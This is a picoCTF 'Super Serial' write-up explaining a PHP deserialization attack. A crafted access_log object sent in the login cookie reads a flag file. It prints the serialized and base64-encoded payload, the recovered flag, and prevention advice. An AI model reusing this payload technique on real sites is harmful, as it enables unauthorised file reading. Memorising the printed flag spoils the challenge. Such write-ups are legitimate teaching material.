# 🏴 picoCTF - Super Serial

> **Category**: Web Exploitation  
> **Difficulty**: Easy-Medium  
> **Tags**: `php`, `serialization`, `cookie`, `LFI`

---

## 📜 Challenge Description

> Try to recover the flag stored on this website.  
> **Hint**: The flag is at `../flag`.

---

## 🔍 Step 1: Reconnaissance

### 🔗 Visit the Site

We are presented with a **login page** that takes a `username` and `password`.

### 🕵️ robots.txt

Checking `robots.txt` (a common first step):

```
http://mercury.picoctf.net:2148/robots.txt
```

Reveals:
```
User-agent: *
Disallow: /admin.phps
```

This tells us there's a source file we shouldn't see — `admin.phps`.
we get a hint that .phps files exist, and true enough, appending s so all pages we see the source php code.

### 📂 View `/index.phps`

Accessing:
```
http://mercury.picoctf.net:2148/index.phps
```

We can view the backend PHP logic. It shows that:

- If login is successful, a `permissions` object is created and:
- It is **serialized**, then **base64 encoded**, then **stored as a cookie** named `login`.

```php
$perm_res = new permissions($username, $password);
setcookie("login", urlencode(base64_encode(serialize($perm_res))), ...);
```

So we know the site uses:
- PHP serialization
- Base64 encoding
- Stores that in a cookie

### 💥 Security Issue Found

Looking into other source files (like `cookie.php`), we find this line:

```php
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
```

Uh-oh! The server is **unserializing data directly from our cookie** — this is a classic **PHP Deserialization Vulnerability**.

---

## 🎯 Step 2: What’s the Plan?

> If we can craft a PHP object (using a class that exists on the server), and it does something useful when deserialized, we can **exploit** it.

Looking more into the codebase, we **guess** there might be other classes — and indeed, eventually we discover (via `/index.phps` or error testing) a class like this exists:

```php
class access_log {
    public $log_file;

    function __destruct() {
        echo file_get_contents($this->log_file);
    }
}
```

This class:
- Has a `__destruct()` method (called when object is destroyed)
- Prints the contents of the file defined in `$log_file`

So... if we can send this object to the server in a cookie, with:
```php
$log_file = "../flag";
```
The server will unserialize it, and **print the flag** when `__destruct()` runs!

---

## 🧪 Step 3: Build the Payload

Here’s how to build the payload step-by-step in PHP:

### 🧱 a) Create Object

```php
class access_log {
    public $log_file = "../flag";
}
```

### 🔗 b) Serialize

```php
$object = new access_log();
$serialized = serialize($object);
```

This gives:
```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```

Explanation:
- `O:10:"access_log"`: Object of class `access_log`
- `1`: One property
- `s:8:"log_file"`: The property name
- `s:7:"../flag"`: The value

### 🔐 c) Base64 Encode

```php
$encoded = base64_encode($serialized);
```

Output:
```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

This is the final payload to use as the value of the `login` cookie.

---

## 🍪 Step 4: Exploit It!

### 1. Open Developer Tools → Application → Cookies
Set the `login` cookie to:

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

### 2. Refresh the page

Boom 💥 — the page prints the contents of the `../flag` file.

---

## 🏁 Flag

```
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}
```

---

## 🧠 Key Takeaways (New Solver Friendly)

| Concept         | Explanation |
|----------------|-------------|
| **PHP `serialize()`** | Converts PHP objects to string format |
| **PHP `unserialize()`** | Reverses it – turns the string back into an object |
| **Cookie Injection** | If the server trusts cookie contents without validation, you can inject objects |
| **`__destruct()` Magic Method** | Executes automatically at the end of the script — dangerous if it reads files, deletes things, or runs commands |
| **Base64** | Just an encoding – often used to safely store binary/serialized data in cookies or URLs |

---

## 🔐 How to Prevent in Real World

- **Never unserialize user input**
- If you must serialize, use formats like **JSON** instead
- Use a **class allowlist** with `unserialize()`:
  ```php
  unserialize($input, ["allowed_classes" => ["permissions"]]);
  ```
- Disable magic methods like `__destruct()` or handle carefully

---

## ✅ Summary

- Found `serialize()` in cookie → saw unserialize() later
- Guessed / found a useful class (`access_log`)
- Created payload with file path → encoded it → injected it
- Read the flag!

---

Happy hacking! 🧠💻🕵️‍♂️
